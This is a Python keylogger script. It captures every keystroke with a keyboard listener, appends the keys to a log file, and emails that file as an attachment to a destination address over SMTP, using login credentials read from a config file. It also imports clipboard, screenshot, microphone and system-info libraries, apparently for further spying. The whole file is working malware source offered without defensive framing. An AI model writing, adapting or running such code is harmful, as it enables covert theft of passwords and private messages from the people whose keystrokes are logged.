#!/usr/bin/env/ python3

# Import libraries

# E-mail libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Standard system libraries to gather info

import socket
import platform

import time
import os

from multiprocessing import Process, freeze_support

# Clipboard library
import win32clipboard

# Keyboard library
from pynput.keyboard import Key, Listener

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get
from PIL import ImageGrab

# Import confiparser
from configparser import ConfigParser
from keylogger.config import Config

config = Config()
config = config.load()

count = 0
keys = []  # Empty list to append keys to


def send_email(filename, attachment, toaddr):
    global config
    fromaddr = config.get('SENDMAIL.PARTIES', 'from')
    from_usr = config.get('SENDMAIL.AUTH', 'login')
    usr_passwd = config.get('SENDMAIL.AUTH', 'password')
    host = config.get('SENDMAIL.SERVER', 'host')
    port = config.getint('SENDMAIL.SERVER', 'port')

    # Prepare our message
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = 'Key Log File'

    body = 'Body_of_the_mail'

    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f'attachment: filename={filename}')
    msg.attach(p)

    # Establish a connection with the SMTP server
    sesh = smtplib.SMTP(host, port)
    sesh.starttls()
    sesh.login(from_usr, usr_passwd)

    text = msg.as_string()
    sesh.sendmail(fromaddr, toaddr, text)

    sesh.quit()


send_email('keys.txt', config.get('FILES', 'key-store'), config.get('SENDMAIL.PARTIES', 'dest'))


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0  # Reset counter
        write_file(keys)  # Write keys
        keys = []  # Reset key list


def write_file(keys):
    with open(config.get('FILES', 'key-store'), 'a') as f:
        for key in keys:
            k = str(key).replace("'", '')
            if k.find('space') > 0:
                f.write('\n')
                f.close()

            elif k.find('Key') == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()